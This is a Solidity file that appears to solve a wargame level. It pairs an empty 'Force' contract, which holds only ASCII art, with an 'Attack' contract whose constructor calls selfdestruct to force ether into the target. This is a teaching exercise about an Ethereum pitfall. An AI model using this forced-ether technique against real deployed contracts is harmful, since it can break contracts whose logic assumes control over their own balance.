// SPDX-License-Identifier: MIT

/****Og Contract****/

pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


/****attack Contract****/

contract Attack{
    constructor(address payable _instanceAddress) public payable {
        selfdestruct(_instanceAddress);
    }
}